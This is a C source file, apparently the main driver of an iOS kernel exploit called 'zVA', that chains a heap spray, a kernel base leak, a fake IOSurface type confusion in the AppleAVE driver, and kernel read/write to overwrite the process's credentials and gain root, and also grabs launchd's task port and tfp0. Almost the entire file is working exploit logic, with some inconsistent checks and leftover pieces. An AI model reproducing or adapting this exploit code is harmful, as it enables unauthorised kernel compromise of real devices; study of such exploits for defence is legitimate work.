#include <stdio.h>
#include <mach/mach.h>
#include "log.h"
#include "kernel_read.h"
#include "apple_ave_pwn.h"
#include "offsets.h"
#include "heap_spray.h"
//#include "dbg.h"
#include "iosurface_utils.h"
#include "rwx.h"
#include "post_exploit.h"
#include "task_ports.h"
#import <mach-o/loader.h>
#import <sys/mman.h>
#import <pthread.h>
#undef __IPHONE_OS_VERSION_MIN_REQUIRED
#include <sys/utsname.h>
#define KERNEL_MAGIC 							(0xfeedfacf)

extern uint64_t procoff;

typedef struct {
    mach_msg_header_t head;
    mach_msg_body_t msgh_body;
    mach_msg_ool_ports_descriptor_t desc[256];
    char pad[4096];
} sprz;


void jbCheck() {
    init_offsets();
    struct utsname u = { 0 };
    uname(&u);
    if (strstr(u.version, "MarijuanARM")) {
        printf("Already Jailbroken.\n");
    }
}

typedef natural_t not_natural_t;

struct not_essers_ipc_object {
    not_natural_t io_bits;
    not_natural_t io_references;
    char    io_lock_data[1337];
};

#define IO_BITS_ACTIVE 0x80000000
#define	IKOT_TASK 2
#define IKOT_IOKIT_CONNECT 29
#define IKOT_CLOCK 25

kern_return_t mach_vm_region
(
 vm_map_t target_task,
 mach_vm_address_t *address,
 mach_vm_size_t *size,
 vm_region_flavor_t flavor,
 vm_region_info_t info,
 mach_msg_type_number_t *infoCnt,
 mach_port_t *object_name
 );

/*
 * Function name: 	print_welcome_message
 * Description:		Prints a welcome message. Includes credits.
 * Returns:			void.
 */

static
void print_welcome_message() {
	kern_return_t ret = KERN_SUCCESS;
	printf("Welcome to zVA! Zimperium's unsandboxed kernel exploit\n");
	printf("Credit goes to: ");
	printf("\tAdam Donenfeld (@doadam) for heap info leak, kernel base leak, type confusion vuln and exploit.\n");
}



/*
 * Function name: 	initialize_iokit_connections
 * Description:		Creates all the necessary IOKit objects for the exploitation.
 * Returns:			kern_return_t.
 */

static
kern_return_t initialize_iokit_connections() {
	
	kern_return_t ret = KERN_SUCCESS;

	ret = apple_ave_pwn_init();
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error initializing AppleAVE pwn");
		goto cleanup;
	}

	ret = kernel_read_init();
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error initializing kernel read");
		goto cleanup;
	}

cleanup:
	if (KERN_SUCCESS != ret)
	{
		kernel_read_cleanup();
		apple_ave_pwn_cleanup();
	}
	return ret;
}


/*
 * Function name: 	cleanup_iokit
 * Description:		Cleans up IOKit resources.
 * Returns:			kern_return_t.
 */

static
kern_return_t cleanup_iokit() {
	
	kern_return_t ret = KERN_SUCCESS;
	kernel_read_cleanup();
	apple_ave_pwn_cleanup();

	return ret;	
}


/*
 * Function name: 	test_rw_and_get_root
 * Description:		Tests our RW capabilities, then overwrites our credentials so we are root.
 * Returns:			kern_return_t.
 */

static
kern_return_t test_rw_and_get_root() {
	
	kern_return_t ret = KERN_SUCCESS;
	uint64_t kernel_magic = 0;

	ret = rwx_read(offsets_get_kernel_base(), &kernel_magic, 4);
	if (KERN_SUCCESS != ret || KERNEL_MAGIC != kernel_magic)
	{
		ERROR_LOG("error reading kernel magic");
		if (KERN_SUCCESS == ret)
		{
			ret = KERN_FAILURE;
		}
		goto cleanup;
	} else {
		DEBUG_LOG("kernel magic: %x", (uint32_t)kernel_magic);
	}

	ret = post_exploit_get_kernel_creds();
	if (KERN_SUCCESS != ret || getuid())
	{
		ERROR_LOG("error getting root");
		if (KERN_SUCCESS == ret)
		{
			ret = KERN_NO_ACCESS;
		}
		goto cleanup;
	}

cleanup:
	return ret;
}

char dt[128];
void performPatches(mach_port_t tfp)
{
  uint64_t kernel_base = offsets_get_kernel_base(); //Still need to edit this 
   mach_port_t pt = MACH_PORT_NULL;
   if(tfp != MACH_PORT_NULL) {
    task_get_special_port(tfp, 4, &pt); // get tfp0
    void exploit(mach_port_t, uint64_t, uint64_t);
    exploit(pt, kernel_base, allproc_offset);
   } else {
    printf("Failed passing tfp...\n");
   }
}



int main(int argc, char const *argv[])
{
    printf("We're now using our katyusha rockets to pwn the kernel in real Gopnik style.\n");
    refresh_task_ports_list();
    mach_port_t launchd_task_port = find_task_port_for_path("/sbin/launchd");
    if (launchd_task_port == MACH_PORT_NULL) {
        printf("failed to get launchd task port\n");
        return 0;
    }
    printf("got task port for launchd: %x\n", launchd_task_port);
	kern_return_t ret = KERN_SUCCESS;
	void * kernel_base = NULL;
	void * kernel_spray_address = NULL;

	print_welcome_message();

	system("id");

	ret = offsets_init();
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error initializing offsets for current device.");
		goto cleanup;
	}

	ret = initialize_iokit_connections();
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error initializing IOKit connections!");
		goto cleanup;
	}

	ret = heap_spray_init();
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error initializing heap spray");
		goto cleanup;
	}

	ret = kernel_read_leak_kernel_base(&kernel_base);
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error leaking kernel base");
		goto cleanup;
	}

	DEBUG_LOG("Kernel base: %p", kernel_base);

	offsets_set_kernel_base(kernel_base);

	ret = heap_spray_start_spraying(&kernel_spray_address);
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error spraying heap");
		goto cleanup;
	}

	ret = apple_ave_pwn_use_fake_iosurface(kernel_spray_address);
	if (KERN_SUCCESS != kIOReturnError)
	{
		ERROR_LOG("Error using fake IOSurface... we should be dead by here.");
	} else {
		DEBUG_LOG("We're still alive and the fake surface was used");
	}

	ret = test_rw_and_get_root();
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("error getting root");
		goto cleanup;
	}

	system("id");


cleanup:
	cleanup_iokit();
	heap_spray_cleanup();
	return ret;
}
